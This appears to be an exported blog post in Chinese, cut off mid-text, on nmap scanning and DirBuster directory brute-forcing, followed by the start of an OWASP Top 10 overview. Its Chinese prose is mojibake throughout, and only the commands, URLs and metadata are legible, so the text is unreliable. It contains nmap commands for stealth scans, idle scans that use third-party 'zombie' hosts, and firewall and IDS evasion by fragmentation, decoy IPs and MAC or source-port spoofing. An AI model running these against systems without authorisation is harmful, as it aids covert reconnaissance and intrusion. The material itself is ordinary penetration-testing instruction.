ä»nmapè¯†åˆ«ç«¯å£çŠ¶æ€Openï¼šå¯¹å¤–å¼€æ”¾Closedï¼šç«¯å£å…³é—­çŠ¶æ€Filteredï¼šé˜²ç«å¢™è¿‡æ»¤æˆ–è€…ç½‘ç»œå µå¡Unfilteredï¼šæœªè¢«è¿‡æ»¤ï¼Œç«¯å£å¯è®¿é—®ï¼Œä½†æ˜¯æ— æ³•åˆ¤æ–­æ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­çŠ¶æ€Open|Filteredï¼šå¼€æ”¾è¿˜æ˜¯è¢«è¿‡æ»¤Closed|Filteredï¼šä¸èƒ½ç¡®å®šæ˜¯å…³é—­è¿˜æ˜¯è¢«è¿‡æ»¤ï¼Œåªå¯èƒ½å‡ºç°åœ¨IPID Idleæ‰«æä¸­ã€‚ 4.2 æ—¶åºé€‰é¡¹åœ¨nmapä¸­ä½¿ç”¨-Tï¼ˆ0-5ï¼‰å¯ä»¥å¯ç”¨æ—¶åºé€‰é¡¹ï¼Œå¯¹äºæ—¶åºé€‰é¡¹è¿™é‡Œæœ‰0~5ä¸åŒé€‰é¡¹ã€‚ -T0ï¼ˆåæ‰§çš„ï¼‰ï¼šéå¸¸æ…¢çš„æ‰«æï¼Œç”¨äºIDSé€ƒé¿ã€‚-T1ï¼ˆé¬¼ç¥Ÿçš„ï¼‰ï¼šç¼“æ…¢çš„æ‰«æï¼Œç”¨äºIDSé€ƒé¿ã€‚-T2ï¼ˆæ–‡é›…çš„ï¼‰ï¼šé™ä½é€Ÿåº¦ä»¥é™ä½å¯¹å¸¦å®½çš„æ¶ˆè€—ï¼Œæ­¤é€‰é¡¹ä¸å¸¸ç”¨ã€‚-T3ï¼ˆæ™®é€šçš„ï¼‰ï¼šé»˜è®¤ï¼Œæ ¹æ®ç›®æ ‡çš„ååº”è‡ªåŠ¨è°ƒæ•´æ—¶é—´ã€‚-T4ï¼ˆé‡è›®çš„ï¼‰ï¼šå¿«é€Ÿæ‰«æï¼Œå¸¸ç”¨æ‰«ææ–¹å¼ï¼Œéœ€è¦åœ¨å¾ˆå¥½çš„ç½‘ç»œç¯å¢ƒä¸‹è¿›è¡Œæ‰«æï¼Œè¯·æ±‚å¯èƒ½ä¼šæ·¹æ²¡ç›®æ ‡ã€‚-T5ï¼ˆç–¯ç‹‚çš„ï¼‰ï¼šæé€Ÿæ‰«æï¼Œè¿™ç§æ‰«ææ–¹å¼ä»¥ç‰ºç‰²å‡†ç¡®åº¦æ¥æç¤ºæ‰«æé€Ÿåº¦ã€‚ 4.3 TCP SYN æ‰«æåŠå¼€æ”¾æ‰«æï¼Œæ‰«æé€Ÿåº¦å¿«ï¼Œæ‰«ææ–¹å¼éšè”½ã€‚ï¼ˆåœ¨SYNæ‰«æä¸èƒ½ç”¨æ—¶ï¼ŒTCPè¿æ¥æ‰«æä¼šä½¿ç”¨é»˜è®¤çš„TCPæ‰«æï¼‰ nmap -sS 192.168.0.12 4.4 TCP è¿æ¥æ‰«æç«¯å£æ‰«æä¸­æœ€åŸºç¡€ï¼Œæœ€ç¨³å®šçš„æ‰«ææ–¹å¼ nmap -sT 192.168.0.12 4.5 UDPæ‰«æUDPæ‰«æéå¸¸ç¼“æ…¢ï¼ŒUDPç«¯å£æ‰«æé€šè¿‡å‘é€UDPæ•°æ®åŒ…åˆ°ç›®æ ‡ä¸»æœºå¹¶ç­‰å¾…å“åº”ï¼Œå®ƒå°†åˆ¤æ–­ç›®æ ‡ç«¯å£æ˜¯å¦å¼€æ”¾çŠ¶æ€ï¼Œå¦‚æœç›®æ ‡è¿”å›ICMPä¸å¯è¾¾çš„é”™è¯¯ï¼Œè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ï¼Œå¦‚æœå¾—åˆ°æ­£ç¡®çš„é€‚å½“çš„å“åº”ï¼Œè¿™è¯´æ˜ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚ nmap -sU -p 80-500 192.168.0.12 4.6 éšè”½æ‰«æ-sNæ˜¯Nullæ‰«æï¼Œæ˜¯é€šè¿‡å‘é€éå¸¸è§„çš„TCPé€šä¿¡æ•°æ®åŒ…å¯¹è®¡ç®—æœºè¿›è¡Œæ¢æµ‹ï¼Œå¾ˆå¤šæƒ…å†µä¸‹Nullæ‰«æä¸Xmasæ‰«ææ°å¥½ç›¸åï¼Œå› ä¸ºNullæ‰«æä¸ä¼šæ ‡è®°ä»»ä½•æ•°æ®åŒ…ï¼Œè‹¥ç›®æ ‡ä¸»æœºçš„ç›¸åº”ç«¯å£æ˜¯å…³é—­çš„ï¼Œä¼šå“åº”ä¸€ä¸ªRSTæ•°æ®åŒ…ï¼Œè‹¥ç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„åˆ™ä¸ä¼šå“åº”ä»»ä½•ä¿¡æ¯ã€‚ nmap -sN 192.168.0.12 -sFæ˜¯FINæ‰«æï¼Œå½“æˆ‘ä»¬ä½¿ç”¨TCP SYNæ‰«ææ—¶å¯èƒ½ä¼šè¢«ç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™å‘ç°ï¼Œä¼šé˜»æ­¢SYNæ•°æ®åŒ…ï¼Œè¿™æ—¶æˆ‘ä»¬ä½¿ç”¨TCP FINæ‰«ææ–¹å¼ä¼šæœ‰å¾ˆå¥½çš„ç©¿é€æ•ˆæœï¼Œå› ä¸ºTCP FINæ‰«æå¹¶ä¸éœ€è¦å®ŒæˆTCPæ¡æ‰‹ã€‚TCP FINæ‰«æå°±æ˜¯å‘ç›®æ ‡ç«¯å£å‘é€ä¸€ä¸ªFINåŒ…ï¼Œå¦‚æœæ”¶åˆ°ç›®æ ‡å“åº”çš„RSTåŒ…ï¼Œåˆ™è¯´æ˜ç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°RSTåŒ…åˆ™è¯´æ˜ç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ã€‚ nmap -sF 192.168.0.12 -sXæ˜¯Xmasæ‰«æï¼Œæ•°æ®åŒ…çš„FINã€PSHå’ŒURGæ ‡è®°ä½ç½®æ‰“å¼€ï¼Œæ—¢æ ‡å¿—ä½1ï¼Œæ ¹æ®RFC 793è§„å®šå¦‚æœç›®æ ‡ä¸»æœºç«¯å£æ˜¯å¼€æ”¾çš„åˆ™ä¼šå“åº”ä¸€ä¸ªRSTæ ‡å¿—åŒ…ã€‚ nmap -sX 192.168.0.12 4.7 TCP ACK æ‰«æä½¿ç”¨è¯¥æ‰«æä¸èƒ½ç¡®å®šç«¯å£æ˜¯å¦æ˜¯å¼€æ”¾è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚ nmap -sA -v 192.168.0.12 4.8 TCP çª—å£æ‰«æå½“æ”¶åˆ°RSTåŒ…æ—¶ï¼Œæ ¹æ®TCPçª—å£çš„å€¼æ˜¯æ­£æ•°è¿˜æ˜¯0æ¥åˆ¤æ–­ç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­çš„ã€‚ ä»è¾“å‡ºç»“æœæ¥çœ‹æ˜¯ä¸å‡†ç¡®çš„ï¼Œå¦‚æœæ‰«æçš„ç«¯å£éƒ½æ˜¯å¼€æ”¾çŠ¶æ€æˆ–è€…åªæœ‰å°‘æ•°å‡ ä¸ªæ˜¯å…³é—­çŠ¶æ€å°±å¾ˆä¸å‡†ç¡®ã€‚ nmap -sW -v -F 192.168.0.12 4.9 TCP Maimonæ‰«ææ¢æµ‹æŠ¥æ–‡æ˜¯FIN/ACK æ ¹æ® RFC 793(TCP)ï¼Œæ— è®ºç«¯å£å¼€æ”¾æˆ–è€…å…³é—­ï¼Œéƒ½åº”è¯¥å¯¹è¿™æ ·çš„æ¢æµ‹å“åº”RSTæŠ¥æ–‡ï¼Œå¦‚æœç«¯å£å¼€æ”¾ï¼Œè®¸å¤šåŸºäºBSDçš„ç³»ç»Ÿåªæ˜¯ä¸¢å¼ƒè¯¥æ¢æµ‹æŠ¥æ–‡ã€‚ nmap -sM -T4 192.168.0.12 4.10 è‡ªå®šä¹‰TCPæ‰«æå¯ä»¥é€šè¿‡æŒ‡å®šä»»æ„çš„TCPæ ‡å¿—ä½æ¥è¿›è¡Œæ‰«æã€‚ nmap -sT â€“scanflags SYNURG 192.168.0.12 4.11 ç©ºé—²æ‰«æç©ºé—²æ‰«æå…è®¸ç«¯å£å®Œå…¨æ¬ºéª—æ‰«æã€‚å¯ä»¥ä½¿æ”»å‡»è€…èƒ½å¤Ÿä¸ä½¿ç”¨è‡ªå·±çš„IPå‘ç›®æ ‡ä¸»æœºå‘é€æ•°æ®åŒ…ï¼Œå®ƒå¯ä»¥åˆ©ç”¨ä¸æ´»è·ƒçš„åƒµå°¸ä¸»æœºåå¼¹ç»™æ”»å‡»è€…ä¸€ä¸ªæ—é€šä¿¡é“ï¼Œä»è€Œè¿›è¡Œç«¯å£æ‰«æã€‚IDSä¼šæŠŠä¸æ´»è·ƒçš„åƒµå°¸ä¸»æœºå½“åšæ”»å‡»è€…ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸éšè”½çš„æ‰«ææ–¹æ³•ã€‚ nmap -sI www.0day.co:80 192.168.0.12 è¿™æ˜¯åˆ©ç”¨åƒµå°¸ä¸»æœºä¸ºwww.0day.coçš„ä¸»æœºå¯¹192.168.0.12è¿›è¡Œç©ºé—²æ‰«æï¼Œå¦‚æœæœ‰IDSï¼ŒIDSåˆ™ä¼šæŠŠwww.0day.coå½“åšæ‰«æè€…ã€‚é€‰æ‹©çš„ç«¯å£å¿…é¡»ä¸èƒ½è¢«è‡ªå·±çš„nmapä¸»æœºæˆ–ç›®æ ‡ä¸»æœºè¿‡æ»¤æ‰å¹¶ä¸”å¿…é¡»ä¸ºå¼€æ”¾çš„ã€‚ 4.12 IPåè®®æ‰«ææ‰«æIPåè®®å·ã€‚IPåè®®æ‰«æå¯ä»¥å¸®åŠ©ç”¨æˆ·ç¡®å®šç›®æ ‡ä¸»æœºå“ªäº›æ˜¯æ”¯æŒIPåè®®çš„ï¼Œä¾‹å¦‚TCP,ICMP.IGMPã€‚è™½ç„¶å®ƒéå†çš„æ˜¯IPåè®®å·å¹¶ä¸æ˜¯TCPæˆ–UDPç«¯å£ï¼Œä½†ä»å¯ä»¥ä½¿ç”¨-pé€‰é¡¹é€‰æ‹©éœ€è¦æ‰«æçš„åè®®å·ã€‚å®ƒä¸æ˜¯åœ¨UDPæŠ¥æ–‡çš„ç«¯å£åŸŸä¸Šå¾ªç¯ï¼Œè€Œæ—¶åœ¨IPåè®®åŸŸçš„2ä½ä¸Šå¾ªç¯ï¼Œå‘é€ç©ºçš„IPæŠ¥æ–‡å¤´ã€‚ nmap -sO -T4 192.168.0.12 4.13 FTP Bounceæ‰«æä½¿ç”¨-bé€‰é¡¹å°±å¯ä»¥è¿›è¡ŒFTP Bounce Scanæ‰«æã€‚å®ƒå…è®¸ç”¨æˆ·è¿æ¥åˆ°ä¸€å°FTPæœåŠ¡å™¨ï¼Œç„¶åè¦æ±‚æ–‡ä»¶é€åˆ°ä¸€å°ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ï¼Œè¿™ç§æ‰«ææ–¹å¼è¢«æ”¯æŒè¾ƒå°‘ï¼Œä½†å¯ç»•è¿‡é˜²ç«å¢™ã€‚ nmap -b 192.168.0.12 0x05 æŒ‡çº¹è¯†åˆ«ä¸æ¢æµ‹ 5.1 è®¾ç½®æ‰«æå¼ºåº¦ä½¿ç”¨Nmapè¿›è¡Œæ‰«æçš„æ—¶å€™ï¼ŒNmapå‘é€ä¸€ç³»åˆ—æ¢æµ‹æŠ¥æ–‡ï¼Œâ€“version-intensityé€‰é¡¹å¯ä»¥ä¸ºæ¯ä¸ªæŠ¥æ–‡èµ‹äºˆ1~9ä¹‹é—´çš„å€¼ã€‚ è¢«èµ‹äºˆè¾ƒä½å€¼çš„æ¢æµ‹æŠ¥æ–‡å¯¹å¤§èŒƒå›´çš„å¸¸è§æœåŠ¡æœ‰æ•ˆï¼Œè€Œè¢«èµ‹äºˆè¾ƒé«˜å€¼çš„æŠ¥æ–‡ä¸€èˆ¬æ²¡æœ‰å®é™…ä½œç”¨ï¼Œå¼ºåº¦æ°´å¹³è¯´æ˜äº†åº”è¯¥ä½¿ç”¨å“ªäº›æ¢æµ‹æŠ¥æ–‡ã€‚ å½“æˆ‘ä»¬èµ‹äºˆçš„å€¼è¶Šé«˜ï¼ŒæœåŠ¡è¶Šæœ‰å¯èƒ½è¢«æ­£ç¡®è¯†åˆ«ï¼Œä½†æ˜¯è¿™ä¹Ÿä¼šç‰ºç‰²ç›¸å½“é•¿çš„ä¸€æ®µå®é™…ï¼Œå¼ºåº¦å¿…é¡»åœ¨0~9ï¼Œé»˜è®¤çš„å¼ºåº¦æ˜¯7ã€‚ nmap -sV â€“version-intensity 1 192.168.0.12 5.2 RPCæ‰«æè¯¥é€‰é¡¹å¯¹ç”¨äºä¸å…¶ä»–ç«¯å£æ‰«æé€‰é¡¹ç›¸ç»“åˆä½¿ç”¨ï¼Œå®ƒå¯¹æ‰€æœ‰è¢«å‘ç°å¼€æ”¾çš„TCP/UDPç«¯å£æ‰§è¡ŒSunRPCç¨‹åºNULLå‘½ä»¤ï¼Œæ¥è¯•å›¾ç¡®å®šå®ƒä»¬æ˜¯å¦ä¸ºRPCç«¯å£ï¼Œå¦‚æœæ˜¯RPCç«¯å£ï¼Œåˆ™è¿”å›ç¨‹åºå’Œç‰ˆæœ¬å·ã€‚ nmap -sS -sR 192.168.0.12 5.3 å¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹ ä½¿ç”¨â€“osscan-limité€‰é¡¹å¯ä»¥å¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹ã€‚ Nmapåªå¯¹æ»¡è¶³â€œå…·æœ‰æ‰“å¼€å’Œå…³é—­çš„ç«¯å£â€æ¡ä»¶çš„ä¸»æœºè¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹ï¼Œè¿™æ ·å¯ä»¥èŠ‚çº¦æ—¶é—´ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨-P0æ‰«æå¤šä¸ªä¸»æœºæ—¶ã€‚ è¿™ä¸ªé€‰é¡¹ä»…åœ¨ä½¿ç”¨-Oæˆ–-Aè¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹æ—¶èµ·ä½œç”¨ã€‚ nmap -O â€“osscan-limit 192.168.0.0/24 0x06 èº²é¿é˜²ç«å¢™nmap-f -v192.168.1.131#æŠ¥æ–‡åˆ†æ®µï¼Œå°†TCPå¤´åˆ†æ®µåœ¨å‡ ä¸ªåŒ…ä¸­ï¼ŒIDSåŠå…¶ä»–å·¥å…·ç›‘æµ‹æ›´åŠ å›°éš¾nmap â€“mtu16192.168.1.131#æŒ‡å®šåç§»å¤§å°ï¼Œè®¾ç½®TCP/IPåè®®ä¼ è¾“æ•°æ®æŠ¥æ—¶çš„æœ€å¤§ä¼ è¾“å•å…ƒï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åç§»é‡å¿…é¡»æ˜¯8çš„å€æ•°nmap -D192.168.1.20,192.168.1.21,192.168.1.22,ME192.168.1.131#IPæ¬ºéª—ï¼Œåœ¨è¿›è¡Œç‰ˆæœ¬æ£€æµ‹æˆ–è€…TCPæ‰«æçš„æ—¶å€™è¯±é¥µæ˜¯æ— æ•ˆçš„-Dï¼ŒæŒ‡å®šè¯±é¥µipï¼Œå¤šä¸ªipç”¨é€—å·éš”å¼€MEï¼ŒæŒ‡å®šçœŸå®IPnmap -sI www.baidu.com:80192.168.1.131#æºåœ°å€æ¬ºéª—nmap â€“source-port88192.168.1.131#æºç«¯å£æ¬ºéª—ï¼ŒæŒ‡å®šä¸€ä¸ªæ¯”è¾ƒå®‰å…¨çš„ç«¯å£ï¼Œnmapå°±å¯ä»¥ä»è¿™äº›ç«¯å£ä¸­å‘é€æ•°æ®nmap â€“data-length30192.168.1.131#æŒ‡å®šå‘åŒ…é•¿åº¦ï¼Œé€šå¸¸TCPåŒ…æ˜¯40å­—èŠ‚ï¼ŒICMP Echoæ˜¯28å­—èŠ‚nmap -sT -PN â€“spoof-mac0192.168.1.131#MACåœ°å€æ¬ºéª—0ï¼ŒéšæœºMACåœ°å€MAC Addressï¼Œæ‰‹åŠ¨æŒ‡å®šMACåœ°å€Vendor Nameï¼ŒæŒ‡å®šå‚å•†ç”ŸæˆMACåœ°å€ 0x07 ä¿å­˜ä¸è¾“å‡º#æ ‡å‡†ä¿å­˜nmap-F-oNtest1.txt192.168.0.12#XMLä¿å­˜nmap-F-oXtest1.xml192.168.0.12#133tä¿å­˜namp-F-oStest2.txt192.168.0.12#Grepä¿å­˜nmap-F-oGtest3.txt192.168.0.12#ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼nmap-F-oAtestA192.168.0.12#è¡¥å……ä¿å­˜æ–‡ä»¶nmap-Fâ€“append-output-oNtest1.txt192.168.0.12 0x08 Nmapé«˜çº§ç”¨æ³•0x09 ä½¿ç”¨Nmapè¿›è¡Œæ¸—é€æµ‹è¯• DirBusterä½¿ç”¨å·¥å…·è¯´æ˜ç›®å½•æ‰«æå·¥å…·DirBusteræ”¯æŒå…¨éƒ¨çš„Webç›®å½•æ‰«ææ–¹å¼ã€‚å®ƒæ—¢æ”¯æŒç½‘é¡µçˆ¬è™«æ–¹å¼æ‰«æï¼Œä¹Ÿæ”¯æŒåŸºäºå­—å…¸æš´åŠ›æ‰«æï¼Œè¿˜æ”¯æŒçº¯æš´åŠ›æ‰«æã€‚è¯¥å·¥å…·ä½¿ç”¨Javaè¯­è¨€ç¼–å†™ï¼Œæä¾›å‘½ä»¤è¡Œï¼ˆHeadlessï¼‰å’Œå›¾å½¢ç•Œé¢ï¼ˆGUIï¼‰ä¸¤ç§æ¨¡å¼ã€‚å…¶ä¸­ï¼Œå›¾å½¢ç•Œé¢æ¨¡å¼åŠŸèƒ½æ›´ä¸ºå¼ºå¤§ã€‚ç”¨æˆ·ä¸ä»…å¯ä»¥æŒ‡å®šçº¯æš´åŠ›æ‰«æçš„å­—ç¬¦è§„åˆ™ï¼Œè¿˜å¯ä»¥è®¾ç½®ä»¥URLæ¨¡ç³Šæ–¹å¼æ„å»ºç½‘é¡µè·¯å¾„ã€‚åŒæ—¶ï¼Œç”¨æˆ·è¿˜å¯¹ç½‘é¡µè§£ææ–¹å¼è¿›è¡Œå„ç§å®šåˆ¶ï¼Œæé«˜ç½‘å€è§£ææ•ˆç‡ã€‚ ä¸‹è½½é“¾æ¥ https://sourceforge.net/projects/dirbuster/files/latest/download å·¥å…·ç”¨æ³•1 .æ‰“å¼€ç»ˆç«¯è¾“å…¥ dirbuster 2 . å¡«å†™æ‰«æä¿¡æ¯ è®¾ç½®fuzzçš„æ—¶å€™ï¼Œå› ä¸º{dir}æ˜¯ä¸ªå˜é‡ï¼Œå¯ä»¥è‡ªç”±å˜æ¢ã€‚ /{dir}http://xxx.com/{dir} è¿™ä¸ª{dir} å¯¹åº”çš„å°±æ˜¯å­—å…¸çš„æ¯ä¸€è¡Œè¿›è¡Œçˆ†ç ´ å¯ä»¥åŠ ç›®å½• /admin/{dir}.php è¿™æ ·å°±æ˜¯çˆ†ç ´adminç›®å½•ä¸‹æ‰€æœ‰phpæ–‡ä»¶ 3 . æŸ¥çœ‹æ‰«æä¿¡æ¯ å­—å…¸åˆ†äº« https://github.com/rootphantomer/Blasting_dictionary ä¿¡æ¯æ”¶é›†","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"owasp-top10","slug":"owasp-top10","date":"2019-03-20T13:17:45.000Z","updated":"2020-09-20T09:06:16.630Z","comments":true,"path":"2019/03/20/owasp-top10/","link":"","permalink":"https://zhangyanlady.github.io/2019/03/20/owasp-top10/","excerpt":"","text":"ä»€ä¹ˆæ˜¯OWASP Top 10OWASPï¼ˆå¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®ï¼‰çš„å·¥å…·ã€æ–‡æ¡£ã€è®ºå›å’Œå…¨çƒå„åœ°åˆ†ä¼šéƒ½æ˜¯å¼€æ”¾çš„ï¼Œå¯¹æ‰€æœ‰è‡´åŠ›äºæ”¹è¿›åº”ç”¨ç¨‹åºå®‰å…¨çš„äººå£«å¼€æ”¾ï¼Œå…¶æœ€å…·æƒå¨çš„å°±æ˜¯â€œ10é¡¹æœ€ä¸¥é‡çš„Web åº”ç”¨ç¨‹åºå®‰å…¨é£é™©åˆ—è¡¨â€ ï¼Œæ€»ç»“äº†Webåº”ç”¨ç¨‹åºæœ€å¯èƒ½ã€æœ€å¸¸è§ã€æœ€å±é™©çš„åå¤§æ¼æ´ï¼Œæ˜¯å¼€å‘ã€æµ‹è¯•ã€æœåŠ¡ã€å’¨è¯¢äººå‘˜åº”çŸ¥åº”ä¼šçš„çŸ¥è¯†ã€‚ A1 æ³¨å…¥injectionå°†ä¸å®‰å…¨çš„å‘½ä»¤ä½œä¸ºå‘½ä»¤å‘é€ç»™è§£æå™¨ï¼Œä¼šäº§ç”Ÿç±»ä¼¼äºSQLæ³¨å…¥ã€NoSQLæ³¨å…¥ã€OSæ³¨å…¥å’ŒLDAPæ³¨å…¥(è½»é‡ç›®å½•è®¿é—®åè®®) çš„ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€šè¿‡æ³¨å…¥ç¼ºé™·çš„è§£æå™¨æ‰§è¡Œæ²¡æœ‰æƒé™çš„éé¢„æœŸå‘½ä»¤æˆ–è®¿é—®æ•°æ®ã€‚ A2 å¤±æ•ˆçš„èº«ä»½è®¤è¯é€šè¿‡é”™è¯¯ä½¿ç”¨åº”ç”¨ç¨‹åºçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†åŠŸèƒ½ï¼Œæ”»å‡»è€…èƒ½å¤Ÿç ´è¯‘å¯†ç ã€å¯†é’¥æˆ–ä¼šè¯ä»¤ç‰Œï¼Œæˆ–è€…æš‚æ—¶æˆ–æ°¸ä¹…çš„å†’å……å…¶ä»–ç”¨æˆ·çš„èº«ä»½ã€‚ A3 æ•æ„Ÿæ•°æ®æ³„éœ²è¿™ä¸ªæ¯”è¾ƒå¥½ç†è§£ï¼Œä¸€èˆ¬æˆ‘ä»¬çš„æ•æ„Ÿä¿¡æ¯åŒ…æ‹¬å¯†ç ã€è´¢åŠ¡æ•°æ®ã€åŒ»ç–—æ•°æ®ç­‰ï¼Œç”±äºwebåº”ç”¨æˆ–è€…APIæœªåŠ å¯†æˆ–ä¸æ­£ç¡®çš„ä¿æŠ¤æ•æ„Ÿæ•°æ®ï¼Œè¿™äº›æ•°æ®ææ˜“é­åˆ°æ”»å‡»è€…åˆ©ç”¨ï¼Œæ”»å‡»è€…å¯èƒ½ä½¿ç”¨è¿™äº›æ•°æ®æ¥è¿›è¡Œä¸€äº›çŠ¯ç½ªè¡Œä¸ºï¼Œå› æ­¤ï¼ŒæœªåŠ å¯†çš„ä¿¡æ¯ææ˜“é­åˆ°ç ´åå’Œåˆ©ç”¨ï¼Œæˆ‘ä»¬åº”è¯¥åŠ å¼ºå¯¹æ•æ„Ÿæ•°æ®çš„ä¿æŠ¤ï¼Œwebåº”ç”¨åº”è¯¥åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®ã€å­˜å‚¨çš„æ•°æ®ä»¥åŠå’Œæµè§ˆå™¨çš„äº¤äº’æ—¶çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¿è¯æ•°æ®å®‰å…¨ã€‚ A4å¤–éƒ¨å®ä½“(XXE)XXE å…¨ç§°ä¸ºXML External Entity attack å³XML(å¯æ‰©å±•æ ‡è®°è¯­è¨€) å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼Œæ—©æœŸæˆ–é…ç½®é”™è¯¯çš„XMLå¤„ç†å™¨è¯„ä¼°äº†XMLæ–‡ä»¶å¤–éƒ¨å®ä½“å¼•ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´çªƒå–URI(ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦)æ–‡ä»¶å¤„ç†å™¨çš„å†…éƒ¨æ–‡ä»¶å’Œå…±äº«æ–‡ä»¶ã€ç›‘å¬å†…éƒ¨æ‰«æç«¯å£ã€æ‰§è¡Œè¿œç¨‹ä»£ç å’Œå®æ–½æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ A5å¤±æ•ˆçš„è®¿é—®æ§åˆ¶é€šè¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œå¯ä»¥è®¿é—®å…¶ä»–ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼Œæ²¡æœ‰å®æ–½æ°å½“çš„è®¿é—®æƒé™ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å»æŸ¥çœ‹æœªæˆæƒçš„åŠŸèƒ½å’Œæ•°æ®ï¼Œeg:è®¿é—®ç”¨æˆ·çš„è´¦æˆ·ã€æ•æ„Ÿæ–‡ä»¶ã€è·å–å’Œæ­£å¸¸ç”¨æˆ·ç›¸åŒçš„æƒé™ç­‰. A6 å®‰å…¨é…ç½®é”™è¯¯å®‰å…¨é…ç½®é”™è¯¯æ˜¯æ¯”è¾ƒå¸¸è§çš„æ¼æ´ï¼Œç”±äºæ“ä½œè€…çš„ä¸å½“é…ç½®(é»˜è®¤é…ç½®ï¼Œä¸´æ—¶é…ç½®ï¼Œå¼€æºäº‘å­˜å‚¨ï¼Œhttpæ ‡å¤´é…ç½®ï¼Œä»¥åŠåŒ…å«æ•æ„Ÿä¿¡æ¯çš„è¯¦ç»†é”™è¯¯)ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›é…ç½®è·å–åˆ°æ›´é«˜çš„æƒé™ï¼Œå®‰å…¨é…ç½®é”™è¯¯å¯ä»¥å‘ç”Ÿåœ¨å„ä¸ªå±‚é¢ï¼ŒåŒ…å«å¹³å°ã€webæœåŠ¡å™¨ã€åº”ç”¨æœåŠ¡å™¨ã€æ•°æ®åº“ã€æ¶æ„å’Œä»£ç ã€‚ A7 è·¨ç«™è„šæœ¬ï¼ˆxssï¼‰xssæ”»å‡»å…¨ç§°ä¸ºè·¨ç«™è„šæœ¬æ”»å‡»,å½“åº”ç”¨ç¨‹åºçš„æ–°ç½‘é¡µä¸­åŒ…å«ä¸å—ä¿¡ä»»çš„ã€æœªç»æ°å½“éªŒè¯ã€è½¬ä¹‰çš„æ•°æ®æˆ–å¯ä»¥ä½¿ç”¨HTMLã€JavaScriptçš„æµè§ˆå™¨APIæ›´æ–°çš„ç°æœ‰ç½‘é¡µæ—¶ï¼Œå°±ä¼šå‡ºç°xssæ¼æ´ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æœ€æ™®éçš„webåº”ç”¨å®‰å…¨æ¼æ´ï¼Œç”šè‡³åœ¨æŸäº›å®‰å…¨å¹³å°éƒ½å­˜åœ¨xssæ¼æ´ã€‚xssä¼šæ‰§è¡Œæ”»å‡»è€…åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œçš„è„šæœ¬ï¼Œå¹¶åŠ«æŒç”¨æˆ·ä¼šè¯ï¼Œç ´åç½‘ç«™æˆ–ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„ç«™ç‚¹ï¼Œä½¿ç”¨xssè¿˜å¯ä»¥æ‰§è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ A8ä¸å®‰å…¨çš„ååºåˆ—åŒ–ä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€é‡æ”¾æ”»å‡»ã€æ³¨å…¥æ”»å‡»æˆ–ç‰¹æƒå‡çº§æ”»å‡» A9ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶ç»„ä»¶(egï¼šåº“ã€æ¡†æ¶æˆ–å…¶ä»–è½¯ä»¶æ¨¡å—)æ‹¥æœ‰åº”ç”¨ç¨‹åºç›¸åŒçš„æƒé™ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä¸­å«æœ‰å·²çŸ¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´è·å–æ•°æ®æˆ–æ¥ç®¡æœåŠ¡å™¨ã€‚åŒæ—¶ï¼Œä½¿ç”¨è¿™äº›ç»„ä»¶ä¼šç ´ååº”ç”¨ç¨‹åºé˜²å¾¡ï¼Œé€ 